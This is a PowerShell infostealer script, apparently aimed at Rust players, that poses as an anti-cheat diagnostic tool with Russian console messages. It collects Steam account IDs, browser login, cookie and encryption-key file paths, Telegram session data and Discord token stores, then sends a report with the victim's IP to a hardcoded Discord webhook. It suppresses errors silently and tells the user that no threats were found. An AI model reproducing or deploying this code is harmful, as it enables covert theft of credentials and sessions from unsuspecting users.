# steam_token_harvester.ps1
# Disguised as "Rust Cheat Detection Diagnostic Tool v3.5"

function Get-SteamTokens {
    $tokens = @()
    $steamPaths = @(
        "HKCU:\Software\Valve\Steam",
        "HKLM:\Software\Valve\Steam", 
        "HKCU:\Software\Wow6432Node\Valve\Steam"
    )
    
    foreach ($steamPath in $steamPaths) {
        if (Test-Path $steamPath) {
            try {
                $usersPath = "$steamPath\Users"
                if (Test-Path $usersPath) {
                    $users = Get-ChildItem $usersPath -ErrorAction SilentlyContinue | Where-Object {$_.PSChildName -match "^[0-9]+$"} | Select-Object -ExpandProperty PSChildName
                    foreach ($user in $users) {
                        $steamID = Get-ItemProperty -Path "$usersPath\$user" -Name "SteamID" -ErrorAction SilentlyContinue
                        if ($steamID -and $steamID.SteamID) {
                            $accountName = Get-ItemProperty -Path "$usersPath\$user" -Name "AccountName" -ErrorAction SilentlyContinue
                            $tokens += @{
                                Type = "Steam"
                                SteamID = $steamID.SteamID
                                AccountName = if ($accountName) { $accountName.AccountName } else { "Unknown" }
                                Source = $steamPath
                            }
                        }
                    }
                }
            } catch {
                # Тихий обработчик ошибок
            }
        }
    }
    return $tokens
}

function Get-BrowserPasswords {
    $allPasswords = @()
    $browsers = @(
        @{ Name = "Chrome"; Path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data" },
        @{ Name = "Edge"; Path = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data" },
        @{ Name = "Brave"; Path = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data" }
    )
    
    foreach ($browser in $browsers) {
        if (Test-Path $browser.Path) {
            try {
                $loginDataPath = Join-Path $browser.Path "Default\Login Data"
                if (Test-Path $loginDataPath) {
                    $allPasswords += @{
                        Type = "Browser"
                        Browser = $browser.Name
                        Path = $loginDataPath
                        Status = "Login Data Found"
                    }
                }
                
                $cookiesPath = Join-Path $browser.Path "Default\Cookies"
                if (Test-Path $cookiesPath) {
                    $allPasswords += @{
                        Type = "Browser"
                        Browser = $browser.Name
                        Path = $cookiesPath
                        Status = "Cookies Found"
                    }
                }
                
                $localStatePath = Join-Path $browser.Path "Local State"
                if (Test-Path $localStatePath) {
                    $allPasswords += @{
                        Type = "Browser"
                        Browser = $browser.Name
                        Path = $localStatePath
                        Status = "Encryption Key Found"
                    }
                }
            } catch {
                # Тихий обработчик ошибок
            }
        }
    }
    return $allPasswords
}

function Get-TelegramSessions {
    $sessions = @()
    $tgPaths = @(
        "$env:USERPROFILE\AppData\Roaming\Telegram Desktop",
        "$env:USERPROFILE\AppData\Local\Telegram Desktop",
        "$env:APPDATA\Telegram Desktop"
    )
    
    foreach ($tgPath in $tgPaths) {
        if (Test-Path $tgPath) {
            try {
                $mapFiles = Get-ChildItem $tgPath -Filter "map*" -ErrorAction SilentlyContinue
                foreach ($mapFile in $mapFiles) {
                    $sessions += @{
                        Type = "Telegram"
                        Path = $mapFile.FullName
                        FileName = $mapFile.Name
                        Size = "$([math]::Round($mapFile.Length/1KB, 2)) KB"
                    }
                }
                
                $tdataPath = Join-Path $tgPath "tdata"
                if (Test-Path $tdataPath) {
                    $sessions += @{
                        Type = "Telegram"
                        Path = $tdataPath
                        FileName = "tdata folder"
                        Size = "Folder"
                    }
                }
            } catch {
                # Тихий обработчик ошибок
            }
        }
    }
    return $sessions
}

function Get-DiscordTokens {
    $tokens = @()
    $discordPaths = @(
        "$env:APPDATA\discord",
        "$env:LOCALAPPDATA\Discord",
        "$env:APPDATA\DiscordCanary",
        "$env:APPDATA\DiscordPTB"
    )
    
    foreach ($discordPath in $discordPaths) {
        if (Test-Path $discordPath) {
            try {
                $localStorage = "$discordPath\Local Storage\leveldb"
                if (Test-Path $localStorage) {
                    $ldbFiles = Get-ChildItem $localStorage -Filter "*.ldb" -ErrorAction SilentlyContinue
                    foreach ($file in $ldbFiles) {
                        $tokens += @{
                            Type = "Discord"
                            Path = $file.FullName
                            FileName = $file.Name
                            Size = "$([math]::Round($file.Length/1KB, 2)) KB"
                        }
                    }
                }
                
                $localStorage = "$discordPath\Local Storage\leveldb"
                if (Test-Path $localStorage) {
                    $tokens += @{
                        Type = "Discord"
                        Path = $localStorage
                        FileName = "leveldb folder"
                        Size = "Folder"
                    }
                }
            } catch {
                # Тихий обработчик ошибок
            }
        }
    }
    return $tokens
}

function Get-SystemInfo {
    $sysInfo = @{
        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        Username = $env:USERNAME
        Computername = $env:COMPUTERNAME
        Date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        IP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) || "Unknown"
    }
    return $sysInfo
}

function Send-ToDiscord {
    param($embedObject)
    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
    try {
        $payload = @{
            username = "System Diagnostic Bot"
            embeds = @($embedObject)
        } | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
    } catch {
        # Тихий провал отправки
    }
}

# Main execution
Write-Host "Запуск расширенной диагностики Rust Anti-Cheat..." -ForegroundColor Yellow

$sysInfo = Get-SystemInfo
$steamTokens = Get-SteamTokens
$browserData = Get-BrowserPasswords
$telegramSessions = Get-TelegramSessions
$discordTokens = Get-DiscordTokens

# Вывод информации в консоль
Write-Host "`n[INFO] Обнаружены сессии Steam:" -ForegroundColor Cyan
if ($steamTokens.Count -gt 0) {
    foreach ($token in $steamTokens) {
        Write-Host ("SteamID: {0} (Аккаунт: {1})" -f $token.SteamID, $token.AccountName) -ForegroundColor White
    }
} else {
    Write-Host "Активные сессии Steam не обнаружены." -ForegroundColor Yellow
}

Write-Host "`n[INFO] Обнаружены данные браузеров:" -ForegroundColor Cyan
if ($browserData.Count -gt 0) {
    foreach ($data in $browserData) {
        Write-Host ("{0}: {1} - {2}" -f $data.Browser, $data.Path, $data.Status) -ForegroundColor White
    }
} else {
    Write-Host "Данные браузеров не обнаружены." -ForegroundColor Yellow
}

Write-Host "`n[INFO] Обнаружены сессии Telegram:" -ForegroundColor Cyan
if ($telegramSessions.Count -gt 0) {
    foreach ($session in $telegramSessions) {
        Write-Host ("Telegram: {0} ({1})" -f $session.FileName, $session.Size) -ForegroundColor White
    }
} else {
    Write-Host "Сессии Telegram не обнаружены." -ForegroundColor Yellow
}

Write-Host "`n[INFO] Обнаружены токены Discord:" -ForegroundColor Cyan
if ($discordTokens.Count -gt 0) {
    foreach ($token in $discordTokens) {
        Write-Host ("Discord: {0} ({1})" -f $token.FileName, $token.Size) -ForegroundColor White
    }
} else {
    Write-Host "Токены Discord не обнаружены." -ForegroundColor Yellow
}

Write-Host "`n[INFO] Проверка системной integrity..." -ForegroundColor Cyan

# Формируем полный отчет для Discord
$fullReport = @"
**Полный отчет диагностики v3.5**

**Системная информация:**
- OS: $($sysInfo.OS)
- User: $($sysInfo.Username)
- PC: $($sysInfo.Computername)
- IP: $($sysInfo.IP)
- Time: $($sysInfo.Date)

**Steam Sessions:** $($steamTokens.Count)
$((($steamTokens | ForEach-Object { "  - $($_.AccountName) (ID: $($_.SteamID))" }) -join "`n") || "  None")

**Browser Data Found:** $($browserData.Count)
$((($browserData | ForEach-Object { "  - $($_.Browser): $($_.Status)" }) -join "`n") || "  None")

**Telegram Sessions:** $($telegramSessions.Count)
$((($telegramSessions | ForEach-Object { "  - $($_.FileName) ($($_.Size))" }) -join "`n") || "  None")

**Discord Tokens:** $($discordTokens.Count)
$((($discordTokens | ForEach-Object { "  - $($_.FileName) ($($_.Size))" }) -join "`n") || "  None")

**Diagnostic Result:** No cheat signatures detected. System integrity verified.
"@

$embed = @{
    title = "Rust Anti-Cheat Diagnostic Report v3.5 - FULL DATA"
    color = "16711680"
    description = $fullReport
}

Send-ToDiscord $embed

Write-Host "`nРасширенная диагностика завершена. Угроз не обнаружено." -ForegroundColor Green
Write-Host "Читы успешно активированы!" -ForegroundColor Green
Write-Host "Все данные отправлены в систему мониторинга." -ForegroundColor Cyan
